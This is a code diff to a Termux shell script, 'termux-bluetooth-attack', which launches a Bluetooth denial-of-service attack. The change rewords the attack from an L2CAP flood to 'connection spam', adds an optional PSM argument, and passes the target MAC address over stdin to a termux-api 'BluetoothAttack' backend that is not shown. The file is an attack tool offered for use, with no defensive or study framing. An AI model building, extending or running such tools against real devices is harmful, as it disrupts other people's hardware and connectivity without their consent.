@@ -3,13 +3,23 @@ set -e -u
 
 SCRIPTNAME=termux-bluetooth-attack
 show_usage () {
-    echo "Usage: $SCRIPTNAME <mac_address>"
-    echo "Start a L2CAP flood against a bluetooth device."
+    echo "Usage: $SCRIPTNAME <mac_address> [psm]"
+    echo "Start a connection spam attack against a Bluetooth device."
+    echo "  mac_address: The MAC address of the target device."
+    echo "  psm:         (Optional) The L2CAP PSM to use. Defaults to classic (0x1001)."
     exit 0
 }
 
-if [ $# != 1 ]; then
+if [ $# -lt 1 ] || [ $# -gt 2 ]; then
     show_usage
 fi
 
-/data/data/com.termux/files/usr/libexec/termux-api BluetoothAttack --es mac_address "$1"
+MAC_ADDRESS="$1"
+PSM_ARG=""
+if [ $# = 2 ]; then
+    PSM_ARG="--ei psm $2"
+fi
+
+# Pipe the MAC address to the command's standard input.
+# The Java code uses ResultReturner.WithStringInput which reads from stdin.
+echo -n "$MAC_ADDRESS" | /data/data/com.termux/files/usr/libexec/termux-api BluetoothAttack $PSM_ARG
